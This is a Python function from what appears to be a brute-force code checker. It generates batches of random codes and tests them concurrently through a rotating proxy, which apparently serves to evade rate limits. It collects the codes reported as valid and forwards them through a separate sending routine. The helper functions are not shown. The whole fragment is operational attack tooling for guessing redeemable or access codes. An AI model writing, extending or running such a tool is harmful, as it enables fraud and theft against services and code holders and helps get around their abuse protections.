def run_batch(batch_num):
    codes = [generate_random_code() for _ in range(BATCH_SIZE)]
    batch_valid = []
    batch_start = time.time()
    
    print(f"\n{'='*70}")
    print(f"📦 BATCH #{batch_num} | Testing {BATCH_SIZE} codes | Using ROTATING PROXY")
    print(f"{'='*70}\n")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_code, code) for code in codes]
        
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                if result["valid"]:
                    batch_valid.append(result["code"])
            except Exception as e:
                with print_lock:
                    print(f"Thread error: {e}")
    
    batch_time = round(time.time() - batch_start, 2)
    speed = round(BATCH_SIZE / batch_time, 1)
    
    print(f"\n{'='*70}")
    print(f"📊 BATCH #{batch_num} COMPLETE")
    print(f"   ✅ Valid codes: {len(batch_valid)}")
    print(f"   ⏱️ Time: {batch_time}s | Speed: {speed} codes/sec")
    print(f"{'='*70}")
    
    if batch_valid:
        send_batch_valid_codes(batch_valid, batch_num)
    else:
        print(f"\n⏸️ Pausing 2 seconds before next batch...\n")
    
    time.sleep(2)
    return batch_valid

